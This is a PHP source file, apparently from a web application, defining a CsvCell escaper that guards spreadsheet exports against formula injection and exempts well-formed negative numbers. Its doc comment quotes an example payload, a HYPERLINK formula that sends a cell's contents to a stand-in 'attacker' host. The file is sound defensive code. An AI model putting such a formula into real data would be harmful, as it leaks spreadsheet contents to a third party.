<?php

declare(strict_types=1);

namespace App\Domain\Export;

/**
 * CSV formula-injection defence.
 *
 * A spreadsheet treats a cell beginning `=`, `+`, `-` or `@` as a formula, so a
 * customer named `=HYPERLINK("http://attacker/?d="&A1,"Click")` becomes an
 * exfiltration payload the moment an accountant opens the export. The value is
 * stored and displayed harmlessly by this application and only becomes live
 * code in Excel — which is precisely why the escaping belongs at the export
 * boundary and nowhere else (SECURITY.md §9.6).
 *
 * A leading apostrophe forces text interpretation in Excel, LibreOffice and
 * Sheets alike.
 *
 * ---------------------------------------------------------------------------
 * ONE DELIBERATE NARROWING OF THE RULE, and the reasoning for it.
 *
 * SECURITY.md §9.6 says escape any cell beginning `-`. Applied literally that
 * escapes `-1450.00`, and every negative figure in a financial export — every
 * refund, every downward adjustment, every loss — arrives in the spreadsheet
 * as TEXT. The column will not sum. For an export whose entire purpose is to
 * be summed, that is not a small cosmetic cost; it is the feature not working,
 * and the predictable result is somebody stripping the escaping wholesale.
 *
 * So a cell is left alone when it is a well-formed number. This does not
 * weaken the guarantee: a string that parses as a number cannot also be a
 * formula. `-1450.00` is a number; `-1+1`, `-A1` and `-HYPERLINK(...)` are not,
 * and every one of them is still escaped. The rule is narrower in wording and
 * identical in effect, which is why it is written here as a single tested
 * predicate rather than left to each call site to reason about.
 * ---------------------------------------------------------------------------
 */
final class CsvCell
{
    /**
     * Leading characters a spreadsheet may treat as the start of a formula.
     *
     * Tab and carriage return are included because both are stripped during
     * paste and can reveal a formula character that was hidden behind them.
     */
    private const DANGEROUS = ['=', '+', '-', '@', "\t", "\r"];

    public static function escape(mixed $value): string
    {
        if ($value === null) {
            return '';
        }

        if (is_bool($value)) {
            // In the reader's language: "Active: Yes" / "نشط: نعم".
            return __($value ? 'labels.boolean.true' : 'labels.boolean.false');
        }

        $string = (string) $value;

        if ($string === '' || ! in_array($string[0], self::DANGEROUS, strict: true)) {
            return $string;
        }

        return self::isNumeric($string) ? $string : "'".$string;
    }

    /**
     * Strict enough that no formula can pass as a number.
     *
     * `is_numeric` accepts hexadecimal and leading whitespace in some PHP
     * versions and accepts `1e5`, which is fine, but an explicit pattern makes
     * the accepted shape reviewable rather than a matter of trusting a
     * built-in's edge cases. Anything outside it is escaped.
     */
    private static function isNumeric(string $value): bool
    {
        return preg_match('/^[+-]?(\d+(\.\d+)?|\.\d+)$/', $value) === 1;
    }
}
